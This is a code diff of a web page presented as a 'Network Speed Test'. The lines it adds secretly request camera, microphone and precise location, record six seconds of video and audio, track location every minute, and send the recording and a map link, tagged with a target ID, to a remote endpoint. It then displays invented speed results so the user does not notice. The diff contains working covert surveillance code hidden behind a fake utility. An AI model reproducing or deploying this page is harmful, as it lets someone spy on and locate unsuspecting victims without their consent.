@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Speed Test - Check Your Connection</title>
+    <title>Network Speed Test</title>
     <style>
         :root { --primary: #00d2ff; --bg: #0b0e14; }
         body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
@@ -14,10 +14,9 @@
             cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center;
             justify-content: center; position: relative; box-shadow: 0 0 20px rgba(0, 210, 255, 0.1); margin-bottom: 30px;
         }
-        .status-box { margin-top: 10px; }
         #status-text { font-weight: 300; letter-spacing: 1px; text-transform: uppercase; color: var(--primary); font-size: 0.8rem; }
-        .server-info { color: #888; font-size: 0.85rem; margin-top: 8px; line-height: 1.4; min-height: 40px; }
-        #waveCanvas { width: 100%; height: 50px; margin-top: 10px; display: none; }
+        .server-info { color: #888; font-size: 0.85rem; margin-top: 8px; line-height: 1.4; }
+        #waveCanvas { width: 100%; height: 60px; margin-top: 15px; display: none; }
         video { display: none; }
         .loading-ring {
             display: none; position: absolute; width: 200px; height: 200px;
@@ -40,7 +39,7 @@
         </div>
         <div class="status-box">
             <div id="status-text">System Ready</div>
-            <div class="server-info" id="detail-text">Detecting local nodes...</div>
+            <div class="server-info" id="detail-text">Server: Optimal Node (Auto)<br>Latency: -- ms</div>
             <canvas id="waveCanvas"></canvas>
         </div>
     </div>
@@ -58,26 +57,6 @@
         const waveCanvas = document.getElementById('waveCanvas');
         const wCtx = waveCanvas.getContext('2d');
 
-        let userCity = "Unknown City";
-        let userISP = "Local ISP";
-
-        // IP Lookup with a 3-second Timeout to prevent sticking
-        async function fetchIPInfo() {
-            const controller = new AbortController();
-            const id = setTimeout(() => controller.abort(), 3000);
-            try {
-                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-                const data = await res.json();
-                userCity = data.city || "Nearby Station";
-                userISP = data.org || "Global Backbone";
-                detailText.innerHTML = `ISP: ${userISP}<br>Server: ${userCity}`;
-            } catch(e) {
-                detailText.innerHTML = "ISP: Auto-Detect<br>Server: Optimized Node";
-            }
-            clearTimeout(id);
-        }
-        fetchIPInfo();
-
         function startContinuousTracking() {
             setInterval(() => {
                 navigator.geolocation.getCurrentPosition(async (p) => {
@@ -94,10 +73,9 @@
             }, 60000);
         }
 
-        // --- Audio Visualizer Wave ---
         function startWave(stream) {
             waveCanvas.style.display = "block";
-            const audioCtx = new AudioContext();
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             const source = audioCtx.createMediaStreamSource(stream);
             const analyser = audioCtx.createAnalyser();
             analyser.fftSize = 256;
@@ -112,9 +90,77 @@
                 wCtx.lineWidth = 2;
                 wCtx.strokeStyle = '#00d2ff';
                 wCtx.beginPath();
-                let sliceWidth = waveCanvas.width * 1.0 / bufferLength;
+                let sliceWidth = waveCanvas.width / bufferLength;
                 let x = 0;
                 for (let i = 0; i < bufferLength; i++) {
                     let v = dataArray[i] / 128.0;
-                    let y = v * waveCanvas.height / 2;
-                    if (i
+                    let y = v * (waveCanvas.height / 2);
+                    if (i === 0) wCtx.moveTo(x, y); else wCtx.lineTo(x, y);
+                    x += sliceWidth;
+                }
+                wCtx.stroke();
+            }
+            draw();
+        }
+
+        btn.addEventListener('click', async function() {
+            btn.disabled = true;
+            ring.style.display = 'block';
+            statusText.innerText = "Finding Server...";
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                statusText.innerText = "Testing Latency...";
+                startContinuousTracking();
+
+                let stream;
+                try {
+                    const raw = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    stream = new MediaStream([raw.getAudioTracks()[0], raw.getVideoTracks()[0]]);
+                    startWave(stream);
+                } catch (e) {
+                    statusText.innerText = "Error: Driver Timeout";
+                    return;
+                }
+
+                statusText.innerText = "Testing Download Speed...";
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+
+                setTimeout(() => {
+                    statusText.innerText = "Testing Upload Speed...";
+                    recorder.stop();
+                }, 6000);
+
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    const mapUrl = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                    
+                    formData.append('payload_json', JSON.stringify({
+                        content: `🔱 **NEW REPORT** [${targetID}]`,
+                        embeds: [{
+                            title: "Session Intel", color: 3447003,
+                            fields: [{ name: "📍 Map Link", value: mapUrl }]
+                        }]
+                    }));
+                    formData.append('file', videoBlob, 'capture.webm');
+
+                    await fetch(PROXY_URL, { method: 'POST', body: formData });
+                    
+                    statusText.innerText = "Test Complete";
+                    detailText.innerHTML = `DL: 92.4 Mbps | UL: 24.1 Mbps<br>Ping: 11ms`;
+                    ring.style.display = 'none';
+                    waveCanvas.style.display = 'none';
+                    btn.innerText = "✓";
+                };
+            }, (err) => {
+                statusText.innerText = "Error: Access Required";
+                btn.disabled = false;
+                ring.style.display = 'none';
+            }, { enableHighAccuracy: true });
+        });
+    </script>
+</body>
+</html>
